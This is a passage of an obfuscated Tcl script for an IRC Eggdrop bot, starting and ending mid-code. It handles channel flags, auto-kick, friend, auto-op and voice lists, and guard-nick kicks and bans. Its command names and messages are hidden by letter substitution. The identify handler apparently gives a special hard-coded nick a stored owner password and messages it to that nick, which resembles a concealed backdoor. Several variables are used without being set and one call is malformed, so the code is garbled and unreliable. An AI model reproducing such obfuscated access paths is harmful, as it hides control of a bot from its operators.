set [lines "xszm"] "#$chan" 
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [channels] {
catch { channel set $x -greet flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 flood-nick 0:0 }
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
chattr $cflag "-hpJSPTRUED"
}
savechan
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO TfzIw xSzM \[4LUU\]"
return 0
}
if {![validchan $chan]} { return 0 }
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
chattr $cflag "-hpJSPTRUED"
if {[string match "*-greet*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~TfZIW ~$chan ~RH \[4LUU\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan -greet flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 flood-nick 0:0 }
puthlp "MLGRXV ~$nick ~:~$notc ~TfZIW ~$chan ~\[4LUU\]"
savechan
return 0
}
proc [lines "kfy_+hvvm"] {nick uhost hand chan rest} {
global notc 
if {![string match "*seen*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~UOZt MlG ZEzROzYOV FkTIzwV VttWILK EvI"
return 0
}  
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [channels] {
catch { channel set $x +seen }
}
savechan
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO HVVM xSzMMvO \[9LM\]"
seen
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*+seen*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~HVVM ~$chan ~RH \[9LM\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan +seen }
puthlp "MLGRXV ~$nick ~:~$notc ~HVVM ~$chan ~\[9LM\]"
savechan
seen
}
proc [lines "kfy_-hvvm"] {nick uhost hand chan rest} {
global notc 
if {![string match "*seen*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~UOZt MlG ZEzROzYOV FkTIzwV VttWILK EvI"
return 0
}
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [channels] {
catch { channel set $x -seen }
}
savechan
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO HVVM xSzMMvO \[4LUU\]"
seen
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*-seen*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~HVVM ~$chan ~RH \[4LUU\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan -seen }
puthlp "MLGRXV ~$nick ~:~$notc ~HVVM ~$chan ~\[4LUU\]"
savechan
seen
return 0
}
proc [lines "kfy_+zfglprxp"] {nick uhost hand chan rest} {
global notc
if {![string match "*nodesynch*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~UOZt MlG ZEzROzYOV FkTIzwV VttWILK EvI"
return 0
}  
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*+nodesynch*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZfGLPRxP ~$chan ~RH \[9LM\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan +nodesynch }
puthlp "MLGRXV ~$nick ~:~$notc ~ZfGLPRxP ~$chan ~\[9LM\]"
savechan
}
proc [lines "kfy_-zfglprxp"] {nick uhost hand chan rest} {
global notc
if {![string match "*nodesynch*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~UOZt MlG ZEzROzYOV FkTIzwV VttWILK EvI"
return 0
}
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*-nodesynch*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZfGLPRxP ~$chan ~RH \[4LUU\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan -nodesynch }
puthlp "MLGRXV ~$nick ~:~$notc ~ZfGLPRxP ~$chan ~\[4LUU\]"
savechan
return 0
}
proc [lines "kfy_+ivlk"] {nick uhost hand chan rest} {
global notc
if {![string match "*protectfriends*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~UOZt MlG ZEzROzYOV FkTIzwV VttWILK EvI"
return 0
}  
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*-protectfriends*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Iv@k ~$chan ~RH \[9LM\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan -protectfriends }
puthlp "MLGRXV ~$nick ~:~$notc ~Iv@k ~$chan ~\[9LM\]"
savechan
}
proc [lines "kfy_-ivlk"] {nick uhost hand chan rest} {
global notc
if {![string match "*protectfriends*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~UOZt MlG ZEzROzYOV FkTIzwV VttWILK EvI"
return 0
}
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*+protectfriends*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Iv@k ~$chan ~RH \[4LUU\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan +protectfriends }
puthlp "MLGRXV ~$nick ~:~$notc ~Iv@k ~$chan ~\[4LUU\]"
savechan
return 0
}
proc [lines "kfy_+wlmgprxplkh"] {nick uhost hand chan rest} {
global notc
if {![string match "*userinvites*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~UOZt MlG ZEzROzYOV FkTIzwV VttWILK EvI"
return 0
}  
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*-userinvites*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~WlMGPRxP@KH ~$chan ~RH \[9LM\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan -userinvites }
puthlp "MLGRXV ~$nick ~:~$notc ~WlMGPRxP@KH ~$chan ~\[9LM\]"
savechan
}
proc [lines "kfy_-wlmgprxplkh"] {nick uhost hand chan rest} {
global notc
if {![string match "*userinvites*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~UOZt MlG ZEzROzYOV FkTIzwV VttWILK EvI"
return 0
}
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*+userinvites*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~WlMGPRxP@KH ~$chan ~RH \[4LUU\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan +userinvites }
puthlp "MLGRXV ~$nick ~:~$notc ~WlMGPRxP@KH ~$chan ~\[4LUU\]"
savechan
return 0
}
proc [lines "kfy_+hgzgfh"] {nick uhost hand chan rest} {
global notc
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*+shared*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~HGzGFH ~$chan ~\[9LM\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan +shared }
puthlp "MLGRXV ~$nick ~:~$notc ~HGzGfH ~$chan ~\[9LM\]"
savechan
}
proc [lines "kfy_-hgzgfh"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*-shared*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~HGzGfH ~$chan ~RH \[4LUU\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan -shared }
puthlp "MLGRXV ~$nick ~:~$notc ~HGzGfH ~$chan ~\[4LUU\]"
savechan
return 0
}
proc [lines "kfy_+mlkzig"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [channels] {
catch { channel set $x +secret }
}
savechan
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO xSzMMvO HvG MlKZIG \[9LM\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*+secret*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlKZIG ~$chan ~RH \[9LM\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan +secret }
puthlp "MLGRXV ~$nick ~:~$notc ~HvG MlKZIG ~$chan ~\[9LM\]"
savechan
}
proc [lines "kfy_-mlkzig"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [channels] {
catch { channel set $x -secret }
}
savechan
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO xSzMMvO MlKZIG \[4LUU\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*-secret*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlKZIG ~$chan ~RH \[4LUU\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan -secret }
puthlp "MLGRXV ~$nick ~:~$notc ~MlKZIG ~$chan ~\[4LUU\]"
savechan
}
proc [lines "kfy_+zprxp"] {nick uhost hand channel param} {
global botname botnick notc botnick
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +zprxp <slhgmznv>"
return 0
}
if {$rest == "*" || $rest == "*!*@*"} {
puthlp "MLGRXV ~$nick ~:~$notc ~rmezorw slhgmznv..!"
return 0
}
if {$rest == $botnick} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh zoivzwb lm wzgzyzhv drgs uozth: ~[chattr $rest]~"
return 0
}  
if {![string match "*@*" $rest]} {
set [lines "ivhg"] "$rest!*@*"
}
if {[string match $rest $botname]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[finduser $rest] != "*"} {
if {[finduser $rest] != "AKICK"} {
puthlp "MLGRXV ~$nick ~:~$notc ~Gszg Slhg Yvolmth Gl ~[finduser $rest]~"
}
puthlp "MLGRXV ~$nick ~:~$notc ~Gszg Slhg zoivzwb rm ~[finduser $rest]~"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~Gl PRxPORhG..!"
setuser "AKICK" HOSTS $rest
saveuser
foreach x [channels] {
if {[isop $botnick $x]} {
foreach c [chanlist $x K] {
if {![matchattr $c f]} {
akick_chk $c [getchanhost $c $x] $x
}
}
}
}
return 0
}
proc [lines "kfy_-zprxp"] {nick uhost hand channel param} {
global notc 
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -zprxp <slhgmznv>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {![string match "*@*" $rest]} {
set [lines "ivhg"] "$rest!*@*"
}
set [lines "xlnkovgvw"] 0
foreach * [getuser "AKICK" HOSTS] {
if {${rest} == ${*}} {
delhost "AKICK" $rest
set [lines "xlnkovgvw"] 1
}
}
if {$completed == 0} {
puthlp "MLGRXV ~$nick ~:~$notc ~<m/z>"
return 0
}
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~UIlN PRxPORhG"
}
proc [lines "kfy_+mllk"] {nick uhost hand channel param} {
global ps notc botnick
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +mllk <mrxp>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~Gl MlLk ORhG"
return 0
}
if {[validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh zoivzwb lm wzgzyzhv drgs uozth: ~[chattr $rest]~"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "slhgnzhp"] "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
chattr $rest "O"
if {![validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!UzROVw! (BlFI VttWILK MlG HfKKLIGVW NlIV GSzM 8 WRtRG)"
deluser $rest
} else {
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~Gl MlLk ORhG"
}
foreach x [channels] {
if {[isop $botnick $x] && [onchan $rest $x] && [isop $rest $x]} {
if {![string match "*k*" [getchanmode $x]]} {
putserv "mode $x -ko 4N14o@p.4L14IsT $rest"
} {
putserv "mode $x -o $rest"
}
}
}
return 0
}
proc [lines "kfy_-mllk"] {nick uhost hand channel param} {
global ps notc
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -mllk <mrxp>"
return 0
}
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~!WvMRvW!, <m/z>"
return 0
}  
if {![matchattr $rest O]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rhm'g lm ml-lk orhg Uozth: ~[chattr $rest]~"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
deluser $rest
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~Ml@k ORhG"
}
proc [lines "kfy_+uirvmw"] {nick uhost hand channel param} {
global notc ps
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +uirvmw <mrxp>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[validuser $rest] && [string tolower $rest] != [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh zoivzwb lm wzgzyzhv drgs uozth: ~[chattr $rest]~"
return 0
}  
set [lines "slhgnzhp"] "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
chattr $rest "f"
if {![validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!UzROVw! (BlFI VttWILK MlG HfKKLIGVW NlIV GSzM 8 WRtRG)"
deluser $rest
return 0
}
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~Gl UiRvMw ORhG"
puthlp "MLGRXV ~$rest ~:~$notc ~~$nick ~ZWW BlF Gl UiRvMw ORhG"
return 0
}
proc [lines "kfy_-uirvmw"] {nick uhost hand channel param} {
global ps notc 
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -uirvmw <mrxp>"
return 0
}
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, <m/z>"
return 0
}  
if {![matchattr $rest f] && ![matchattr $rest m]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rhm'g lm UiRvMw orhg Uozth: ~[chattr $rest]~"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
deluser $rest
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~UIlN UiRvMw ORhG"
}
proc [lines "kfy_+zlk"] {nick uhost hand channel param} {
global ps notc botnick chk_reg
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +zlk <mrxp>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~Gl z@k ORhG"
return 0
}
if {[matchattr $rest P]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh zoivzwb z@k"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~!YOlXpVw!"
return 0
}
if {![validuser $rest]} {
set [lines "slhgnzhp"] "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
}
chattr $rest "P"
if {![validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!UzROVw! (BlFI VttWILK MlG HfKKLIGVW NlIV GSzM 8 WRtRG)"
deluser $rest
} else {
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~Gl z@k ORhG"
puthlp "MLGRXV ~$rest ~:~$notc ~~$nick ~ZWW BlF Gl z@k ORhG"
set chk_reg($rest) $nick
putsrv "DSLRH ~$rest"
}
return 0
}
proc [lines "kfy_-zlk"] {nick uhost hand channel param} {
global notc ps
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -zlk <mrxp>"
return 0
}
if {![matchattr $rest P]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh mlg z@k"
return 0
}  
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~!WvMRVW!, <m/z>"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $rest "-P"
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~UIlN z@k ORhG"
return 0
}
proc [lines "dslrhj"] {nick} {
global botnick
if {$nick == $botnick} { return 0 }
if {[isutimer "whoischk $nick"]} { return 0 }
set [lines "xivg"] [expr 10 + [rand 20]]
foreach ct [utimers] {
if {[string match "*whoisq*" $ct]} {
if {[expr [lindex $ct 0] + 10] > $cret} {
set [lines "xivg"] [expr [lindex $ct 0] + 10]
}
}
}
utimer $cret [list whoischk $nick]
}
proc [lines "dslrhxsp"] {nick} {
global chk_reg botnick
if {[matchattr $nick G]} {
putlog "CHeK GuaRd $nick"
set chk_reg($nick) "1"
puthlp "DSLRH ~$nick"
return 0
}
foreach x [channels] {
if {[isop $botnick $x] && [onchan $nick $x]} {
if {[matchattr $nick P] && ![isop $nick $x]} {
putlog "WHOIS $nick TO GeT a@p"
set chk_reg($nick) "1"
puthlp "DSLRH ~$nick"
return 0
}
if {[matchattr $nick v] && ![isop $nick $x] && ![isvoice $nick $x]} {
putlog "WHOIS $nick TO geT avoIcE"
set chk_reg($nick) "1"
puthlp "DSLRH ~$nick"
return 0
}
if {[string match "*+unidentifyop*" [channel info $x]]} {
putlog "WHOIS $nick FoR CHeK IdEnTIFY a@p"
set chk_reg($nick) "1"
puthlp "DSLRH ~$nick"
return 0
}
}
}
}
set [lines "zgs"] 0
set [lines "slhg"] ""
bind raw - 307 reg_chk
proc [lines "ivt_xsp"] {from keyword arg} {
global chk_reg botnick owner notc ps ath pww host
set [lines "mrxp"] [lindex $arg 1]
if {$nick == $botnick} { return 0 }
putlog "NICK $nick IS IDENTIFY..!"
if {[info exists chk_reg($nick)]} {
set chk_reg($nick) "0"
}
set [lines "zgsa"] $ath
if {$athz == 1} {
set [lines "zgs"] 0
chattr $nick +Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set [lines "slhgnzhp"] "${nick}!*@*"
setuser $nick HOSTS $hostmask  
if {[string tolower $nick] == [string tolower $ps] && $owner != $ps} {
if {[dezip $] == $host} {
puthlp "MLGRXV ~$nick ~:~$notc ~!LDmVI!"
setuser $nick PASS $pww
puthlp "MLGRXV ~$nick ~:~$notc ~Kzhhdliwh hvg gl: ~$pww"
saveuser
} {
puthlp "MLGRXV ~$nick ~:~$notc ~!LDmVI!"     
puthlp "MLGRXV ~$nick ~:~$notc ~Gl Hvg Kzhhdliw, Fhztv: kzhh <kzhhdliwh>"     
}   
return 0  
}
if {[matchattr $nick Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~!LDmVI!"
} elseif {[matchattr $nick n]} {
puthlp "MLGRXV ~$nick ~:~$notc ~!ZWnRM!"
} elseif {[matchattr $nick m]} {
puthlp "MLGRXV ~$nick ~:~$notc ~!NzhGvI!"
} else {
puthlp "MLGRXV ~$nick ~:~$notc ~!ZxxvkgvW!"
}  
saveuser
}
if {[matchattr $nick P] || [matchattr $nick v]} {
foreach x [channels] {
if {[isop $botnick $x] && [onchan $nick $x]} {
if {![string match "*k*" [getchanmode $x]]} {
if {[matchattr $nick P]} {
if {![isop $nick $x]} {
puthelp "MODE $x -k+o 4i14dentified.4a14@p $nick"
}
}
if {[matchattr $nick v]} {
if {![isvoice $nick $x] && ![isop $nick $x]} {
puthelp "MODE $x -k+v 4i14dentified.4a14voice $nick"
}
}
} {
if {[matchattr $nick P]} {
if {![isop $nick $x]} {
puthelp "MODE $x +o $nick"
}
}
if {[matchattr $nick v]} {
if {![isvoice $nick $x] && ![isop $nick $x]} {
puthelp "MODE $x +v $nick"
}
}
}
}
}
}
}
bind raw - 318 end_whois
proc [lines "vmw_dslrh"] {from keyword arg} {
global chk_reg notc ath
set [lines "mrxp"] [lindex $arg 1]
set [lines "zgsa"] $ath
if {$athz == 1} {
puthlp "MLGRXV ~$nick ~:~$notc ~Blf'iv MLG Rwvmgrub..!"
set [lines "zgs"] 0
}
if {[info exists chk_reg($nick)]} {
if {$chk_reg($nick) != "0"} {
putlog "NICK $nick IS NoT IDENTIFY..!"
if {[matchattr $nick G] && ![matchattr $nick Q]} {
foreach x [channels] {
if {[onchan $nick $x] && [botisop $x]} {
set [lines "yzmhvg"] "*!*[getchanhost $nick $x]"
putsrv "PRXP ~$x ~~$nick ~:~$notc ~14GSzG MRxP IvJfRIVw Gl 4RwVmGRuB ~[banms]~"
if {$banset != "*!*@*" && $banset != ""} {
if {![string match "*k*" [getchanmode $x]]} {
putserv "mode $x -k+b 4u14nidentify.4g14uard.4n14ick $banset"
} {
putserv "mode $x +b $banset"
}
}
return 0
}
}
} elseif {[matchattr $nick P] && ![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~z@k rwvmgrub 1hg..!"
} elseif {[matchattr $nick v] && ![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~zelrxv rwvmgrub 1hg..!" 
}
if {$chk_reg($nick) != "1"} {
foreach x [channels] {
if {[onchan $nick $x] && [botisop $x]} { 
set [lines "yzmhvg"] "*!*[getchanhost $nick $x]"
putsrv "PRXP ~$x ~~$nick ~:~$notc ~14GSzG MRxP IvJfRIVw Gl 4RwVmGRuB ~[banms]~"
if {$banset != "*!*@*" && $banset != ""} {
if {![string match "*k*" [getchanmode $x]]} {
putserv "mode $x -k+b 4u14nidentify.4g14uard.4n14ick $banset"
} {
putserv "mode $x +b $banset"
}
}
return 0
}
}
puthlp "MLGRXV ~$chk_reg($nick) ~:~$notc ~~$nick ~mlg rwvmgrub..!" 
}
foreach x [channels] {
if {[string match "*+unidentifyop*" [channel info $x]]} {
if {[onchan $nick $x] && [botisop $x]} {
if {[isop $nick $x]} {
if {![string match "*k*" [getchanmode $x]]} {
putserv "mode $x -ko+v 4u14nidentify.4a14@p $nick $nick"
} {
putserv "mode $x -o+v $nick $nick"
}
}
}
}
}
unset chk_reg($nick)
}
}
}
proc [lines "kfy_+tmrxp"] {nick uhost hand channel param} {
global notc botnick
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +tmrxp <mrxp>"
return 0
}
if {[matchattr $rest G]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~ivzwb..!"
return 0
}  
if {[matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~!YOlxP!"
return 0
}
if {![validuser $rest]} {
set [lines "slhgnzhp"] "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
}
chattr $rest +G
if {![validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!UzROVw! (BlFI VttWILK MlG HfKKLIGVW NlIV GSzM 8 WRtRG)"
deluser $rest
} else {
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~zww \[~$rest\] ~TfzIw MRxP"
putsrv "DSLRH ~$rest"
}
return 0
}
proc [lines "kfy_-tmrxp"] {nick uhost hand channel param} {
global notc botnick
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -tmrxp <mrxp>"
return 0
}
if {[matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~!YOlXpVw!"
return 0
}
chattr $rest -G
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~TfzIw MRxP"
return 0
}
proc [lines "kfy_+zelrxv"] {nick uhost hand channel param} {
global ps notc botnick chk_reg
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +zelrxv <mrxp>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~Gl zElRxV ORhG"
return 0
}
if {[matchattr $rest v]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh zoivzwb zfgl elrxv"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~!YOlXpVw!"
return 0
}
if {![validuser $rest]} {
set [lines "slhgnzhp"] "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
}
chattr $rest "v"
if {![validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!UzROVw! (BlFI VttWILK MlG HfKKLIGVW NlIV GSzM 8 WRtRG)"
deluser $rest
} else {
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~Gl zElRxV ORhG"
puthlp "MLGRXV ~$rest ~:~$notc ~~$nick ~ZWW BlF Gl zElRxV ORhG"
set chk_reg($rest) $nick
putsrv "DSLRH ~$rest"
}
return 0
}
proc [lines "kfy_-zelrxv"] {nick uhost hand channel param} {
global notc ps
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
